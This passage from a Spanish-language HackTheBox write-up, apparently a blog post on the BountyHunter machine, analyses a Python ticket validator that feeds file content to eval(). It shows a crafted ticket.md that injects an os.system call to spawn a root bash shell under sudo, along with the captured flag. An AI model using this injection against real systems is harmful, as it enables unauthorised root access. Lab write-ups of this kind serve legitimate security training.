        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"# Skytrain Inc"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">continue</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"## Ticket to "</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Destination: </span><span class="si">{</span><span class="s">' '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">3</span><span class="p">:])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"__Ticket Code:__"</span><span class="p">):</span>
            <span class="n">code_line</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">code_line</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">code_line</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"**"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="n">ticketCode</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"+"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">ticketCode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">))</span>
                <span class="k">if</span> <span class="n">validationNumber</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">True</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">fileName</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Please enter the path to the ticket file.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">ticket</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>
    <span class="c1">#DEBUG print(ticket)
</span>    <span class="n">result</span> <span class="o">=</span> <span class="n">evaluate</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Valid ticket."</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Invalid ticket."</span><span class="p">)</span>
    <span class="n">ticket</span><span class="p">.</span><span class="n">close</span>

<span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><p>Tras analizar el código, deduzco su funcionamiento:</p><ol><li>Se pide especificar la ruta de un fichero por consola.<li>Se comprueba que el fichero especificado acabe en “.md”, es decir, que se trate de un fichero Markdown.<ul><li>Si es así, procede a abrir el archivo y continúa en el paso 3.<li>Si no es así, muestra un mensaje de formato de archivo incorrecto y cierra la aplicación.</ul><li>Se entra a una función de evaluación del archivo abierto en el paso anterior. A cada una de las líneas del fichero abierto se le asigna un número mediante la función <em>enumerate()</em> y se entra en un bucle que tendrá tantas iteraciones como nº de líneas tenga el archivo.<li>Se comprueba que la primera línea del archivo comienza con la cadena de texto “# Skytrain Inc”.<ul><li>Si es así, se aplica un <em>continue</em> para que el bucle siga en la próxima iteración, llegando así al paso 5.<li>Si no es así, muestra un mensaje de ticket inválido, cierra el descriptor del archivo abierto y el programa termina.</ul><li>Se comprueba que la segunda línea del archivo empieza por la cadena de texto “## Ticket to “.<ul><li>Si es así, muestra por pantalla el destino, que correspondería al texto a partir de la tercera palabra de la línea. Después, aplica un <em>continue</em> para que el bucle siga en la próxima iteración, llegando así al paso 6.<li>Si no es así, muestra un mensaje de ticket inválido, cierra el descriptor del archivo abierto y el programa termina.</ul><li>Se comprueba que la tercera línea del archivo empieza por la cadena de texto “__Ticket Code:__” (en este caso no hay ningún condicional con el número de línea, pero si no cumple con la condición acabará retornando False y mostrando el mensaje de ticket inválido).<ul><li>Si es así, iguala el valor de la variable “code_line” al valor de la variable “i” incrementado en 1. Después, aplica un <em>continue</em> para que el bucle siga en la próxima iteración, llegando así al paso 7.<li>Si no es así, muestra un mensaje de ticket inválido, cierra el descriptor del archivo abierto y el programa termina.</ul><li>Se comprueba que la cuarta línea comienza con “**” (en este caso tampoco hay ningún condicional con el número de línea, pero debido a la asignación de valor que se le dio a “code_line” anteriormente, siempre entrara en esta condición la línea siguiente a la que empiece por “__Ticket Code:__”, es decir, la tercera).<ul><li>Si es así, elimina los asteriscos mediante la función <em>replace()</em> y separa la cadena de texto en los diferentes campos delimitados por el simbolo “+”. De estos campos, se asigna el valor del primero a la variable “ticketCode” y continúa en el paso 8.<li>Si no es así, muestra un mensaje de ticket inválido, cierra el descriptor del archivo abierto y el programa termina.</ul><li>Se castea la variable “ticketCode” a un número entero (int o integer) y se comprueba si el resto de la división de este número entre 7 es igual a 4.<ul><li>Si es así, utiliza la función <em>eval()</em> sobre el contenido de la línea, eliminando los asteriscos. Esta función permite realizar operaciones aritmético/lógicas y ejecutar sentencias de Python (para más información, se puede consultar el siguiente <a href="https://realpython.com/python-eval-function/">artículo</a>. En este caso, parece que el uso correcto sería realizar una operación matemática y continuaría en el paso 9.<li>Si no es así, muestra un mensaje de ticket inválido, cierra el descriptor del archivo abierto y el programa termina.</ul><li>Se comprueba si el valor obtenido tras la operación realizada por <em>eval()</em> es mayor de 100.<ul><li>Si es así, muestra un mensaje de ticket válido, cierra el descriptor del archivo abierto y el programa termina.<li>Si no es así, muestra un mensaje de ticket inválido, cierra el descriptor del archivo abierto y el programa termina.</ul></ol><p>Con esto, veo que la potencial vía de ataque se encuentra en la función <em>eval()</em>, ya que se puede controlar la entrada que recibe la función a través del fichero de ticket que solicita al principio. Por tanto, la idea sería crear un ticket que permita ejecutar comandos en el sistema a través de sentencias en Python. De hecho, al estar ejecutándose el programa con permisos de superusuario, podría ejecutar un comando que me generase directamente una shell como root.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>development@bountyhunter:~$ cat ticket.md

# Skytrain Inc
## Ticket to Essex
__Ticket Code:__
**11+321 and __import__('os').system('/bin/bash -i -p')
##Issued: 2021/05/12
#End Ticket
</pre></table></code></div></div><p>El ticket que se muestra anteriormente está modificado de un ejemplo inválido que encuentro en la ruta “/opt/skytrain_inc/invalid_tickets”. El ticket pasará los primeros condicionales y, al llegar a la función <em>eval()</em>, realizará la suma aritmética y, tras ello, la operación lógica “and”, que permitirá ejecutar la sentencia de Python que generará una shell como root.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py

Please enter the path to the ticket file.
ticket.md
Destination: Essex

root@bountyhunter:/home/development# cat /root/root.txt

61908fd82c3f1bfd0b1416590dd16077
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/xxe/" class="post-tag no-text-decoration" >xxe</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a> <a href="/tags/wrapper/" class="post-tag no-text-decoration" >wrapper</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >sudo</a> <a href="/tags/python-code-review/" class="post-tag no-text-decoration" >python_code_review</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=BountyHunter (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/bountyhunter-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=BountyHunter (Hack The Box) - J0lm3d0&u=https://j0lm3d0.github.io/posts/bountyhunter-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=BountyHunter (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/bountyhunter-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', '¡Enlace copiado correctamente!')" data-toggle="tooltip" data-placement="top" title="Copiar enlace"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Actualizado recientemente</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/tier-0-starting-point-machines-(hack-the-box)/">Tier 0 Starting Point Machines (Hack The Box)</a><li><a href="/posts/previse-(hack-the-box)/">Previse (Hack The Box)</a><li><a href="/posts/couch-(try-hack-me)/">Couch (Try Hack Me)</a><li><a href="/posts/knife-(hack-the-box)/">Knife (Hack The Box)</a><li><a href="/posts/pentesting_shells_cheat_sheet_script/">Pentesting_Shells-Cheat_Sheet-Script</a></ul></div><div id="access-tags"> <span>Etiquetas en tendencia</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contenidos</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Más entradas</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/armageddon-(hack-the-box)/"><div class="card-body"> <span class="timeago small" >24 Jul 2021<i class="unloaded">2021-07-24T21:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Armageddon (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Armageddon de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de ...</p></div></div></a></div><div class="card"> <a href="/posts/thenotebook-(hack-the-box)/"><div class="card-body"> <span class="timeago small" >31 Jul 2021<i class="unloaded">2021-07-31T21:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TheNotebook (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina TheNotebook de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de...</p></div></div></a></div><div class="card"> <a href="/posts/knife-(hack-the-box)/"><div class="card-body"> <span class="timeago small" >28 Aug 2021<i class="unloaded">2021-08-28T21:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Knife (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Knife de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resol...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/couch-(try-hack-me)/" class="btn btn-outline-primary" prompt="Anterior"><p>Couch (Try Hack Me)</p></a> <a href="/posts/boilerctf-(try-hack-me)/" class="btn btn-outline-primary" prompt="Siguiente"><p>Boiler CTF (Try Hack Me)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/J0lm3d0">J0lm3d0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Etiquetas en tendencia</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://j0lm3d0.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No se han encontrado resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
